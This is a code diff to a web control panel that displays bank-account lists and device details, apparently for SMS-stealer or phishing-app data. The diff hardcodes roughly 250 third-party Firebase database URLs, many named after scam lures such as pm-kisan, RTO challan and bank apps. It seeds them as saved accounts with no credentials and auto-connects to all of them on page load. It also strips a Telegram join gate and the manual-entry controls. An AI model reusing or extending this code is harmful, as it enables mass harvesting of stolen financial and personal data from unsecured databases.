@@ -5253,46 +5253,6 @@
     .bank-account-list span { color: #949087; font: 600 9px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace; }
     .bank-account-list b { color: #148447; font-size: 12px; white-space: nowrap; }
 
-    .firebase-summary-section {
-        padding: 16px;
-        border: 1px solid #ead8bc;
-        border-radius: 18px;
-        background: linear-gradient(135deg, #fffdf8, #fff7e8);
-        box-shadow: 0 12px 30px rgba(96,60,8,.07);
-    }
-    .firebase-summary-head { display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:14px; }
-    .firebase-summary-head h2 { color:#24272d; font-size:14px; font-weight:900; }
-    .firebase-summary-head p { margin-top:2px; color:#8a8176; font-size:10px; }
-    .firebase-summary-actions { display:flex; align-items:center; gap:8px; }
-    .quick-add-firebase-toggle { min-height:30px; padding:0 12px; border:1px solid #ffb857; border-radius:10px; color:#d96700; background:#fff8ea; font-size:10px; font-weight:900; white-space:nowrap; transition:.16s ease; }
-    .quick-add-firebase-toggle:hover { color:#fff; background:#f58216; border-color:#f58216; box-shadow:0 6px 16px rgba(219,105,0,.18); }
-    .quick-add-firebase-form { display:grid; grid-template-columns:minmax(0,1.5fr) minmax(0,1fr) auto; gap:8px; margin:-2px 0 14px; padding:10px; border:1px solid #f0d3aa; border-radius:13px; background:#fff; box-shadow:0 7px 20px rgba(90,57,10,.06); }
-    .quick-add-firebase-form input { min-width:0; height:36px; padding:0 11px; border:1px solid #e5d8c5; border-radius:9px; color:#34383d; background:#fffdfa; font-size:10px; outline:none; }
-    .quick-add-firebase-form input:focus { border-color:#f39a24; box-shadow:0 0 0 3px rgba(243,154,36,.11); }
-    .quick-add-firebase-form > button { height:36px; padding:0 14px; border-radius:9px; color:#fff; background:linear-gradient(135deg,#ff9b12,#f36b1c); font-size:10px; font-weight:900; white-space:nowrap; }
-    .quick-add-firebase-form > button:disabled { opacity:.6; cursor:wait; }
-    .firebase-summary-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:10px; }
-    .firebase-summary-empty { grid-column:1/-1; display:grid; justify-items:center; gap:4px; padding:30px 16px; border:1px dashed #e7c999; border-radius:14px; color:#8c8173; background:rgba(255,255,255,.55); text-align:center; }
-    .firebase-summary-empty strong { color:#47433d; font-size:12px; }
-    .firebase-summary-empty span { font-size:10px; }
-    .firebase-summary-card-shell { position:relative; min-width:0; border:1px solid #eadcc8; border-radius:14px; background:#fffdfa; transition:.16s ease; overflow:hidden; }
-    .firebase-summary-card-shell:hover,.firebase-summary-card-shell.selected { border-color:#f0ae48; background:#fff8e9; box-shadow:0 8px 20px rgba(190,112,8,.09); }
-    .firebase-summary-card-main { display:flex; align-items:center; justify-content:space-between; gap:12px; width:100%; min-height:70px; padding:13px 42px 13px 13px; text-align:left; }
-    .firebase-summary-card-main > div { display:grid; min-width:0; gap:3px; }
-    .firebase-summary-card-main strong { color:#4a453e; font-size:11px; font-weight:900; }
-    .firebase-summary-card-main span { color:#8c857c; font-size:9px; font-weight:700; }
-    .firebase-summary-card-main > b { color:#148447; font-size:14px; white-space:nowrap; }
-    .firebase-summary-remove { position:absolute; top:8px; right:8px; z-index:2; display:grid; place-items:center; width:25px; height:25px; border:1px solid #ffc3bc; border-radius:8px; color:#ef4d40; background:#fff5f3; font-size:17px; font-weight:500; line-height:1; transition:.15s ease; }
-    .firebase-summary-remove:hover { color:#fff; border-color:#ef4d40; background:#ef4d40; transform:scale(1.04); }
-    .firebase-summary-card {
-        display:flex; align-items:center; justify-content:space-between; gap:12px; width:100%; padding:13px;
-        border:1px solid #eadcc8; border-radius:14px; text-align:left; background:#fffdfa;
-    }
-    .firebase-summary-card:hover,.firebase-summary-card.selected { border-color:#f0ae48; background:#fff8e9; box-shadow:0 8px 20px rgba(190,112,8,.09); }
-    .firebase-summary-card > div { display:grid; min-width:0; gap:3px; }
-    .firebase-summary-card strong { color:#4a453e; font-size:11px; font-weight:900; }
-    .firebase-summary-card span { color:#8c857c; font-size:9px; font-weight:700; }
-    .firebase-summary-card > b { color:#148447; font-size:14px; white-space:nowrap; }
     .firebase-bank-panel { margin-top:14px; padding:14px; border:1px solid #eadcc8; border-radius:15px; background:#fff; }
     .firebase-bank-panel-head { display:flex; align-items:center; justify-content:space-between; gap:12px; margin-bottom:10px; }
     .firebase-bank-panel-head > div { display:grid; gap:2px; }
@@ -5431,10 +5391,7 @@
         .bank-consolidated-head { align-items: flex-start; flex-direction: column; }
         .balance-head-actions { width: 100%; justify-content: space-between; }
         .bank-consolidated-grid { grid-template-columns: 1fr; }
-        .firebase-summary-head { align-items:flex-start; flex-direction:column; }
-        .firebase-summary-actions { width:100%; justify-content:space-between; flex-wrap:wrap; }
         .quick-add-firebase-form { grid-template-columns:1fr; }
-        .firebase-summary-grid,.firebase-bank-grid { grid-template-columns:1fr; }
         .device-detail-panel { width:calc(100vw - 12px) !important; max-width:420px !important; height:calc(100lvh - 12px) !important; margin:6px 6px 6px auto !important; border:1px solid #dfd3c1 !important; border-radius:18px 0 0 18px; overflow:hidden; }
         .device-detail-header {
             min-height: 54px !important;
@@ -5598,34 +5555,6 @@
     </style>
 </head>
 <body>
-<!-- Telegram mandatory-join gate -->
-<style id="telegram-join-gate-style">
-#telegram-join-gate{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.92);font-family:Arial,sans-serif}
-#telegram-join-gate .tg-card{width:min(92vw,420px);padding:28px;border-radius:18px;background:#111;color:#fff;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
-#telegram-join-gate h2{margin:0 0 10px;font-size:24px}#telegram-join-gate p{color:#bbb;line-height:1.5}
-#telegram-join-gate a,#telegram-join-gate button{display:block;width:100%;box-sizing:border-box;margin-top:12px;padding:13px 16px;border:0;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;text-decoration:none}
-#telegram-join-gate a{background:#229ED9;color:#fff}#telegram-join-gate button{background:#2b2b2b;color:#fff}
-</style>
-<div id="telegram-join-gate" aria-modal="true" role="dialog">
-  <div class="tg-card">
-    <h2>Join our Telegram</h2>
-    <p>Please join <b></b> before entering the panel.</p>
-    <a id="telegram-join-link" href="" target="_blank" rel="noopener noreferrer">Join Telegram</a>
-    <button id="telegram-continue" type="button">I've joined — Enter Panel</button>
-  </div>
-</div>
-<script>
-(function(){
-  var gate=document.getElementById('telegram-join-gate');
-  var join=document.getElementById('telegram-join-link');
-  var cont=document.getElementById('telegram-continue');
-  // Open Telegram automatically when the panel starts.
-  try { window.open('','_blank','noopener,noreferrer'); } catch(e) {}
-  cont.addEventListener('click',function(){ gate.remove(); });
-  join.addEventListener('click',function(){ setTimeout(function(){},0); });
-})();
-</script>
-
     <div id="root"></div>
     <script>
 (function() {
@@ -18892,8 +18821,7 @@ function maskFirebase(A) {
     }
 }
 function optionalFirebaseKey(A) {
-    const tt = String(A||"").trim();
-    return tt || Array.from({ length: 5 }, () => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[Math.floor(Math.random()*36)]).join("")
+    return String(A || "").trim();
 }
 function normalizeFirebaseUrl(A) {
     const tt = String(A||"").trim(), b = tt.match(/https?:\/\/[^\s\])]+(?:firebaseio\.com|firebasedatabase\.app)/i);
@@ -19425,18 +19353,315 @@ function Zu({
 function s1({
     onConnect: A
 }) {
-    const [tt, b] = jt.useState([]), [d, S] = jt.useState(!1), [f, p] = jt.useState(""), [h, o] = jt.useState(""), [x, T] = jt.useState(""), [w, C] = jt.useState(!1), [v, E] = jt.useState(""), [g, z] = jt.useState(!1), [N, k] = jt.useState(!1), [M, H] = jt.useState(""), [L, nt] = jt.useState(null), [V, ot] = jt.useState(""), [bulkText, setBulkText] = jt.useState(""), $ = jt.useRef(null), csvInput = jt.useRef(null);
+    const BUILT_IN_FIREBASE_URLS = [
+  "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
+  "https://abgwal-default-rtdb.firebaseio.com",
+  "https://abhirt-58f65-default-rtdb.firebaseio.com",
+  "https://absbsb-73abb-default-rtdb.firebaseio.com",
+  "https://access6-5c65b-default-rtdb.firebaseio.com",
+  "https://adamm-green-default-rtdb.firebaseio.com",
+  "https://adani-5dd2c-default-rtdb.firebaseio.com",
+  "https://aditya-9f66b-default-rtdb.firebaseio.com",
+  "https://admidog-default-rtdb.firebaseio.com",
+  "https://admin-39ss-default-rtdb.firebaseio.com",
+  "https://admin-98208-default-rtdb.firebaseio.com",
+  "https://admin-panel-b2935-default-rtdb.firebaseio.com",
+  "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
+  "https://admin-pannel-3fe32-default-rtdb.firebaseio.com",
+  "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
+  "https://admin143-dab82-default-rtdb.firebaseio.com",
+  "https://ajay-33c1b-default-rtdb.firebaseio.com",
+  "https://ajna-20fc4-default-rtdb.firebaseio.com",
+  "https://akash-ka-jija-ji-default-rtdb.firebaseio.com",
+  "https://akashkajija-default-rtdb.firebaseio.com",
+  "https://aman-eafb9-default-rtdb.firebaseio.com",
+  "https://amit-ka-71-default-rtdb.firebaseio.com",
+  "https://amramram-d7a15-default-rtdb.firebaseio.com",
+  "https://anuxtg-panel-default-rtdb.firebaseio.com",
+  "https://anvy-5-default-rtdb.firebaseio.com",
+  "https://apnatime-90581-default-rtdb.firebaseio.com",
+  "https://arun-4024e-default-rtdb.firebaseio.com",
+  "https://aryanhaisharma-f2739-default-rtdb.firebaseio.com",
+  "https://aug1-ea7c9-default-rtdb.firebaseio.com",
+  "https://axis-c4bd3-default-rtdb.firebaseio.com",
+  "https://barik-a53e5-default-rtdb.firebaseio.com",
+  "https://bega-8457c-default-rtdb.firebaseio.com",
+  "https://bhakbsdk-default-rtdb.firebaseio.com",
+  "https://bullpass-f2c8c-default-rtdb.firebaseio.com",
+  "https://bunty-51bcc-default-rtdb.firebaseio.com",
+  "https://challan5-default-rtdb.firebaseio.com",
+  "https://chandan-7d25e-default-rtdb.firebaseio.com",
+  "https://check-skyler-default-rtdb.firebaseio.com",
+  "https://chfjfj-c2857-default-rtdb.firebaseio.com",
+  "https://chilgumsir-default-rtdb.firebaseio.com",
+  "https://chtpiyskl-default-rtdb.firebaseio.com",
+  "https://chuchi-e90f8-default-rtdb.firebaseio.com",
+  "https://cjarkuadmin-default-rtdb.firebaseio.com",
+  "https://comkingdir-default-rtdb.firebaseio.com",
+  "https://courier40-30jan-default-rtdb.firebaseio.com",
+  "https://crahul-abcb4-default-rtdb.firebaseio.com",
+  "https://crdio-3cf5c-default-rtdb.firebaseio.com",
+  "https://crow-59d20-default-rtdb.firebaseio.com",
+  "https://cust-6-default-rtdb.firebaseio.com",
+  "https://cyclonechor-default-rtdb.firebaseio.com",
+  "https://cyreopanel-ebd18-default-rtdb.firebaseio.com",
+  "https://dammmii-default-rtdb.firebaseio.com",
+  "https://danish-77fe3-default-rtdb.firebaseio.com",
+  "https://deepak-c22e3-default-rtdb.firebaseio.com",
+  "https://deepk-hh-default-rtdb.firebaseio.com",
+  "https://demonrat-aa782-default-rtdb.firebaseio.com",
+  "https://desert-fc320-default-rtdb.firebaseio.com",
+  "https://devilop-c0b6d-default-rtdb.firebaseio.com",
+  "https://do-admin-v25-default-rtdb.firebaseio.com",
+  "https://download-b7393-default-rtdb.firebaseio.com",
+  "https://drahul-3bd1b-default-rtdb.firebaseio.com",
+  "https://e13turnament2-default-rtdb.firebaseio.com",
+  "https://electric-a8025-default-rtdb.firebaseio.com",
+  "https://emesh-94556-default-rtdb.firebaseio.com",
+  "https://espot-f5761-default-rtdb.firebaseio.com",
+  "https://example-default-rtdb.firebaseio.com",
+  "https://expert-5e1a0-default-rtdb.firebaseio.com",
+  "https://fir-7bed7-default-rtdb.firebaseio.com",
+  "https://fir-ffe67-default-rtdb.firebaseio.com",
+  "https://fir-new-fe8b8-default-rtdb.firebaseio.com",
+  "https://flick-f1879-default-rtdb.firebaseio.com",
+  "https://fpro3indus-default-rtdb.firebaseio.com",
+  "https://freefire-c51f2-default-rtdb.firebaseio.com",
+  "https://fuckoff-1d8ba-default-rtdb.firebaseio.com",
+  "https://fuckwebpanels-ff4a7-default-rtdb.firebaseio.com",
+  "https://gadhalalund-default-rtdb.firebaseio.com",
+  "https://gdhxu-d4b7c-default-rtdb.firebaseio.com",
+  "https://gren-ff2af-default-rtdb.firebaseio.com",
+  "https://guru-bb1c9-default-rtdb.firebaseio.com",
+  "https://haab-b3370-default-rtdb.firebaseio.com",
+  "https://hamza-5a3c2-default-rtdb.firebaseio.com",
+  "https://harrwp-6be36-default-rtdb.firebaseio.com",
+  "https://hdhdusgsvshshshs-default-rtdb.firebaseio.com",
+  "https://hloo-acc63-default-rtdb.firebaseio.com",
+  "https://hood-4ba1e-default-rtdb.firebaseio.com",
+  "https://hospital-8707c-default-rtdb.firebaseio.com",
+  "https://hrworkreal-01-default-rtdb.firebaseio.com",
+  "https://hsm2pro21-default-rtdb.firebaseio.com",
+  "https://htbc51-default-rtdb.firebaseio.com",
+  "https://human-34-kumar-default-rtdb.firebaseio.com",
+  "https://i-am-subhu-default-rtdb.firebaseio.com",
+  "https://iakaksi-default-rtdb.firebaseio.com",
+  "https://iiiii-ade0e-default-rtdb.firebaseio.com",
+  "https://ikka-eb7e5-default-rtdb.firebaseio.com",
+  "https://imdum-6e873-default-rtdb.firebaseio.com",
+  "https://jack-22c5f-default-rtdb.firebaseio.com",
+  "https://jannu-c03ea-default-rtdb.firebaseio.com",
+  "https://jayramprasad-14859-default-rtdb.firebaseio.com",
+  "https://jchchc-5f16d-default-rtdb.firebaseio.com",
+  "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
+  "https://john-carder-default-rtdb.firebaseio.com",
+  "https://jonisins-52271-default-rtdb.firebaseio.com",
+  "https://jsjsjkskskskdkld-default-rtdb.firebaseio.com",
+  "https://juliy-b71b7-default-rtdb.firebaseio.com",
+  "https://kalih-f389d-default-rtdb.firebaseio.com",
+  "https://kalimaago-1a80d-default-rtdb.firebaseio.com",
+  "https://karan-kumar-7d353-default-rtdb.firebaseio.com",
+  "https://keepsnss-default-rtdb.firebaseio.com",
+  "https://king-simgh-default-rtdb.firebaseio.com",
+  "https://kingskh-1b6b7-default-rtdb.firebaseio.com",
+  "https://kishm-1d858-default-rtdb.firebaseio.com",
+  "https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
+  "https://krisna574-ffef3-default-rtdb.firebaseio.com",
+  "https://kunalji-default-rtdb.firebaseio.com",
+  "https://landlele-20855-default-rtdb.firebaseio.com",
+  "https://ludasur-maharaj-dk-default-rtdb.firebaseio.com",
+  "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
+  "https://mahanivip-kituk10-default-rtdb.firebaseio.com",
+  "https://managment-406ca-default-rtdb.firebaseio.com",
+  "https://matrixpannel81-default-rtdb.firebaseio.com",
+  "https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
+  "https://maxo12-default-rtdb.firebaseio.com",
+  "https://mod-hack-a3a9a-default-rtdb.firebaseio.com",
+  "https://moodoff-d7b81-default-rtdb.firebaseio.com",
+  "https://mook-1ddfc-default-rtdb.firebaseio.com",
+  "https://mpari-6a6e5-default-rtdb.firebaseio.com",
+  "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
+  "https://mrtarzan2-76d17-default-rtdb.firebaseio.com",
+  "https://mutthi-68-default-rtdb.firebaseio.com",
+  "https://my-penel-maxjoker98-default-rtdb.firebaseio.com",
+  "https://naruto-db425-default-rtdb.firebaseio.com",
+  "https://navin-9fb56-default-rtdb.firebaseio.com",
+  "https://newappjune-default-rtdb.firebaseio.com",
+  "https://newhatyyy-default-rtdb.firebaseio.com",
+  "https://newtan3450-default-rtdb.firebaseio.com",
+  "https://no-admin-e0a30-default-rtdb.firebaseio.com",
+  "https://odabu-91972-default-rtdb.firebaseio.com",
+  "https://okok-77c0d-default-rtdb.firebaseio.com",
+  "https://ooop-21df8-default-rtdb.firebaseio.com",
+  "https://palms-568c7-default-rtdb.firebaseio.com",
+  "https://panel-9-d6ece-default-rtdb.firebaseio.com",
+  "https://panel123628-default-rtdb.firebaseio.com",
+  "https://pint-f465b-default-rtdb.firebaseio.com",
+  "https://pinta-c3912-default-rtdb.firebaseio.com",
+  "https://pintu-9efee-default-rtdb.firebaseio.com",
+  "https://pm-kisan-13gfh-default-rtdb.firebaseio.com",
+  "https://pm-kisan-17hh-default-rtdb.firebaseio.com",
+  "https://pm-kisan-21gvh-default-rtdb.firebaseio.com",
+  "https://pm-kisan-22f92-default-rtdb.firebaseio.com",
+  "https://pm-kishan-b3-default-rtdb.firebaseio.com",
+  "https://pm-kishan-f4fbb-default-rtdb.firebaseio.com",
+  "https://pm-modi-06hlhu-default-rtdb.firebaseio.com",
+  "https://pm49-15021-default-rtdb.firebaseio.com",
+  "https://pmnr1newad-default-rtdb.firebaseio.com",
+  "https://ponal2-default-rtdb.firebaseio.com",
+  "https://premmiiii-default-rtdb.firebaseio.com",
+  "https://pri14-b45dd-default-rtdb.firebaseio.com",
+  "https://prof-b6a64-default-rtdb.firebaseio.com",
+  "https://puja-app-50785-default-rtdb.firebaseio.com",
+  "https://pussy-25f3c-default-rtdb.firebaseio.com",
+  "https://q58erags-default-rtdb.firebaseio.com",
+  "https://rahul-b2df7-default-rtdb.firebaseio.com",
+  "https://raj-admin-nokia-default-rtdb.firebaseio.com",
+  "https://raj-kumar-cbded-default-rtdb.firebaseio.com",
+  "https://rajesh-pikachucustomer-default-rtdb.firebaseio.com",
+  "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
+  "https://rajucs-bca5d-default-rtdb.firebaseio.com",
+  "https://rambhai-2c356-default-rtdb.firebaseio.com",
+  "https://rambhai-45c3a-default-rtdb.firebaseio.com",
+  "https://ramesh-67a2b-default-rtdb.firebaseio.com",
+  "https://rantaishita-f7614-default-rtdb.firebaseio.com",
+  "https://ranu-e604c-default-rtdb.firebaseio.com",
+  "https://raushan-kumar-pro-default-rtdb.firebaseio.com",
+  "https://rdkkk-a6706-default-rtdb.firebaseio.com",
+  "https://rea72-1566e-default-rtdb.firebaseio.com",
+  "https://rettiugh-default-rtdb.firebaseio.com",
+  "https://riyy-e012e-default-rtdb.firebaseio.com",
+  "https://rkdm-2e65f-default-rtdb.firebaseio.com",
+  "https://rkdmaster-3e927-default-rtdb.firebaseio.com",
+  "https://rohet10-8919f-default-rtdb.firebaseio.com",
+  "https://rohitadmin-c723e-default-rtdb.firebaseio.com",
+  "https://rolex-carder-default-rtdb.firebaseio.com",
+  "https://rrrrqrt-default-rtdb.firebaseio.com",
+  "https://rto-02-april06-default-rtdb.firebaseio.com",
+  "https://rto-61z-apr-29-amit-default-rtdb.firebaseio.com",
+  "https://rto50-84d38-default-rtdb.firebaseio.com",
+  "https://rtochallan-8579d-default-rtdb.firebaseio.com",
+  "https://rtochallan8-default-rtdb.firebaseio.com",
+  "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
+  "https://rupa-36767-default-rtdb.firebaseio.com",
+  "https://sabji4-default-rtdb.firebaseio.com",
+  "https://sallu-9934f-default-rtdb.firebaseio.com",
+  "https://sand-f20a5-default-rtdb.firebaseio.com",
+  "https://sandhya-eaa8a-default-rtdb.firebaseio.com",
+  "https://sangwan-3b64b-default-rtdb.firebaseio.com",
+  "https://sanjana-admin-panel-default-rtdb.firebaseio.com",
+  "https://seuihd-default-rtdb.firebaseio.com",
+  "https://sexy-chat-for-alex-default-rtdb.firebaseio.com",
+  "https://sexychatown2-default-rtdb.firebaseio.com",
+  "https://shankar-tipul-default-rtdb.firebaseio.com",
+  "https://sintuadmin-default-rtdb.firebaseio.com",
+  "https://soni-bbb64-default-rtdb.firebaseio.com",
+  "https://sonusk-46467-default-rtdb.firebaseio.com",
+  "https://ssgg-5416f-default-rtdb.firebaseio.com",
+  "https://strom-90e84-default-rtdb.firebaseio.com",
+  "https://stsfk30aug-default-rtdb.firebaseio.com",
+  "https://sultn-a2ece-default-rtdb.firebaseio.com",
+  "https://suraj-b9a86-default-rtdb.firebaseio.com",
+  "https://svuhgfgg-default-rtdb.firebaseio.com",
+  "https://syst6-5ee6d-default-rtdb.firebaseio.com",
+  "https://tabuna-4e962-default-rtdb.firebaseio.com",
+  "https://tekoff-7a789-default-rtdb.firebaseio.com",
+  "https://testingyou-2dcac-default-rtdb.firebaseio.com",
+  "https://tillu-2-default-rtdb.firebaseio.com",
+  "https://totla-axis-default-rtdb.firebaseio.com",
+  "https://tracegod-168d5-default-rtdb.firebaseio.com",
+  "https://tuuui-60b15-default-rtdb.firebaseio.com",
+  "https://u16714964-283ef-default-rtdb.firebaseio.com",
+  "https://u24143844-c1b11-default-rtdb.firebaseio.com",
+  "https://u24153206-5eef6-default-rtdb.firebaseio.com",
+  "https://u25428732-91bd9-default-rtdb.firebaseio.com",
+  "https://u62751482-f5b46-default-rtdb.firebaseio.com",
+  "https://udaya-47819-default-rtdb.firebaseio.com",
+  "https://udkudjudj-default-rtdb.firebaseio.com",
+  "https://ueuwuw-default-rtdb.firebaseio.com",
+  "https://union-b656e-default-rtdb.firebaseio.com",
+  "https://vampirebhsuhan-default-rtdb.firebaseio.com",
+  "https://vecna-82db2-default-rtdb.firebaseio.com",
+  "https://vggogo-79fcb-default-rtdb.firebaseio.com",
+  "https://vibfghhh-default-rtdb.firebaseio.com",
+  "https://vikasda-f153e-default-rtdb.firebaseio.com",
+  "https://vikash-da-default-rtdb.firebaseio.com",
+  "https://vipuladmin-e105e-default-rtdb.firebaseio.com",
+  "https://vishnu-fde67-default-rtdb.firebaseio.com",
+  "https://wait-5fead-default-rtdb.firebaseio.com",
+  "https://xiaoms-6c15b-default-rtdb.firebaseio.com",
+  "https://xipher-pnl-default-rtdb.firebaseio.com",
+  "https://yellow-new-panel-srt-rto-zziam-default-rtdb.firebaseio.com",
+  "https://yellow-panel-src-rto-apk-default-rtdb.firebaseio.com",
+  "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
+  "https://yellowpanel-9f036-default-rtdb.firebaseio.com",
+  "https://yes2-ead3d-default-rtdb.firebaseio.com",
+  "https://yohichahiye-default-rtdb.firebaseio.com",
+  "https://yono-sb41-default-rtdb.firebaseio.com",
+  "https://yuttdftt-default-rtdb.firebaseio.com",
+  "https://zxcv-b2d2a-default-rtdb.firebaseio.com",
+  "https://zxcvbnm-13fb3-default-rtdb.firebaseio.com",
+  "https://shadow-f9cd3-default-rtdb.firebaseio.com",
+  "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
+  "https://gfaatelisell-default-rtdb.firebaseio.com",
+  "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
+  "https://alwaysatiif7-default-rtdb.firebaseio.com",
+  "https://tinmur-777e8-default-rtdb.firebaseio.com",
+  "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
+  "https://sk-paid-panel-default-rtdb.firebaseio.com",
+  "https://vasu-new-panel-default-rtdb.firebaseio.com",
+  "https://brodj-162c6-defaul-rtdb.firebaseio.com",
+  "https://mera-19f84-defaul-rtdb.firebaseio.com",
+  "https://flashowmv1-enginepower-default-rtdb.firebaseio.com",
+  "https://heisenberg-8c3da-default-rtdb.firebaseio.com",
+  "https://aujla-afe1a-default-rtdb.firebaseio.com",
+  "https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
+  "https://flash-v8enginepower-default-rtdb.firebaseio.com"
+];
+    const BUILT_IN_FIREBASE_URL = BUILT_IN_FIREBASE_URLS[0];
+    const [tt, b] = jt.useState([]), [d, S] = jt.useState(!1), [f, p] = jt.useState(BUILT_IN_FIREBASE_URL), [h, o] = jt.useState(""), [x, T] = jt.useState(""), [w, C] = jt.useState(!1), [v, E] = jt.useState(""), [g, z] = jt.useState(!1), [N, k] = jt.useState(!1), [M, H] = jt.useState(""), [L, nt] = jt.useState(null), [V, ot] = jt.useState(""), [bulkText, setBulkText] = jt.useState(""), $ = jt.useRef(null), csvInput = jt.useRef(null);
     jt.useEffect(() => {
-        const _ = Yp();
-        b(_);
+        // Seed every built-in Firebase project into Saved Accounts once.
+        // No Firebase API key/secret is added; credentials remain blank.
+        const existing = Yp();
+        const seededFlag = "signize_all_firebase_accounts_seeded_v2";
+        let accounts = existing;
+
+        if (!localStorage.getItem(seededFlag)) {
+            const existingUrls = new Set(
+                existing.map(item => normalizeFirebaseUrl(item.url))
+            );
+
+            const builtInAccounts = BUILT_IN_FIREBASE_URLS
+                .map((url, index) => ({
+                    id: Date.now() + index,
+                    url: normalizeFirebaseUrl(url),
+                    key: "",
+                    date: new Date().toLocaleString()
+                }))
+                .filter(item => item.url && !existingUrls.has(item.url));
+
+            accounts = [...existing, ...builtInAccounts];
+            nh(accounts);
+            localStorage.setItem(seededFlag, "1");
+        }
+
+        b(accounts);
         const U = new URLSearchParams(window.location.search).get("s");
         if (U) {
             const J = l1(U);
             if (J) {
                 window.history.replaceState({}, "", window.location.pathname);
-                const ut = _.find(_t => _t.url === J.url);
-                ut ? xt(ut.url, ut.key) : ht(J.url, J.key, _)
+                const ut = accounts.find(_t => _t.url === J.url);
+                ut ? xt(ut.url, ut.key) : ht(J.url, J.key, accounts);
+                return;
             }
+        }
+
+        // Automatically connect all built-in Firebase accounts and open the dashboard.
+        // No manual Connect button is required.
+        if (accounts.length) {
+            setTimeout(() => connectMany(accounts), 0);
         }
     }, []);
     const ht = async (_, X, U) => {
@@ -19466,7 +19691,7 @@ function s1({
             } catch(connErr2) {
                 const msg2 = connErr2 instanceof Error ? connErr2.message : String(connErr2);
                 if (msg2.includes("PERMISSION_DENIED")) {
-                    T("Permission Denied: Use Database Secret key, not API key.");
+                    T("Permission denied: this Firebase project does not allow access.");
                 } else if (msg2.includes("Network error") || msg2.includes("Failed to fetch")) {
                     T("Network error. Check Firebase URL format.");
                 } else {
@@ -19543,7 +19768,7 @@ function s1({
             const _ = normalizeFirebaseUrl(f),
                 X = optionalFirebaseKey(h);
             if (!_) {
-                T("Please enter Firebase URL");
+                T("Please select a built-in Firebase project");
                 return
             }
             const U = tt.find(ut => ut.url === _);
@@ -19565,7 +19790,7 @@ function s1({
             } catch(connErr) {
                 const msg = connErr instanceof Error ? connErr.message : String(connErr);
                 if (msg.includes("PERMISSION_DENIED")) {
-                    T("Permission Denied: Use Database Secret key, not API key.");
+                    T("Permission denied: this Firebase project does not allow access.");
                 } else if (msg.includes("Network error") || msg.includes("Failed to fetch")) {
                     T("Network error. Check Firebase URL format.");
                 } else {
@@ -19729,7 +19954,7 @@ Error: ${_t}`)
                                     children: `Firebase · ${maskFirebase(_.url)}`
                                 }), r.jsxs("p", {
                                     className: "text-xs text-muted-foreground mt-0.5 font-mono",
-                                    children: [_.date, " · Credential saved"]
+                                    children: [_.date, " · Built-in Firebase"]
                                 })]
                             }), r.jsxs("div", {
                                 className: "flex items-center gap-2",
@@ -19751,43 +19976,6 @@ Error: ${_t}`)
                                 })]
                             })]
                         }, _.id))
-                    }), r.jsxs("button", {
-                        onClick: () => {
-                            S(!0), T(""), y()
-                        },
-                        className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl border border-dashed border-border hover:border-red-600/50 hover:bg-red-950/10 text-muted-foreground hover:text-red-400 transition-all text-sm font-medium",
-                        children: [r.jsx(gp, {
-                            className: "w-4 h-4"
-                        }), "New Account"]
-                    }), tt.length > 1 && r.jsx("button", {
-                        onClick: () => connectMany(tt),
-                        disabled: w,
-                        className: "bulk-connect-btn w-full mt-2 py-3 rounded-xl text-sm font-bold disabled:opacity-50",
-                        children: w ? "Connecting all…" : `Connect All ${tt.length} Firebase`
-                    }), r.jsxs("label", {
-                        className: "csv-import-btn w-full mt-2 flex items-center justify-center gap-2 py-3 rounded-xl border border-dashed text-sm font-semibold cursor-pointer",
-                        children: [r.jsx(gp, { className: "w-4 h-4" }), "Import Excel / CSV", r.jsx("input", {
-                            ref: csvInput,
-                            type: "file",
-                            accept: ".xlsx,.csv,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,text/csv",
-                            onChange: importCsv,
-                            className: "hidden"
-                        })]
-                    }), r.jsx("textarea", {
-                        value: bulkText,
-                        onChange: _ => setBulkText(_.target.value),
-                        rows: 4,
-                        spellCheck: !1,
-                        placeholder: "Bulk manual paste — one per line:\nhttps://project1.firebaseio.com\nhttps://project2.firebaseio.com, OPTIONAL_KEY",
-                        className: "bulk-manual-input"
-                    }), r.jsx("button", {
-                        onClick: connectManualBulk,
-                        disabled: w || !bulkText.trim(),
-                        className: "bulk-manual-btn",
-                        children: w ? "Connecting…" : "Save & Connect Pasted Firebase"
-                    }), r.jsx("p", {
-                        className: "csv-format-note",
-                        children: "Firebase URL required · Key optional (auto 5-character code if blank)"
                     })]
                 }), d && r.jsxs("div", {
                     className: "animate-fade-up",
@@ -19934,24 +20122,24 @@ Error: ${_t}`)
                         children: [r.jsxs("div", {
                             children: [r.jsx("label", {
                                 className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-2",
-                                children: "Firebase Database URL"
-                            }), r.jsx("input", {
-                                type: "text",
+                                children: "Built-in Firebase Project"
+                            }), r.jsx("select", {
                                 value: f,
                                 onChange: _ => p(_.target.value),
-                                placeholder: "https://your-project.firebaseio.com",
-                                className: "w-full px-4 py-3 rounded-xl bg-muted/50 border border-border focus:border-red-500 focus:ring-2 focus:ring-red-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
+                                className: "w-full px-4 py-3 rounded-xl bg-muted/50 border border-border focus:border-red-500 focus:ring-2 focus:ring-red-500/20 outline-none text-sm text-foreground transition-all font-mono",
+                                children: BUILT_IN_FIREBASE_URLS.map(_ => r.jsx("option", {
+                                    value: _,
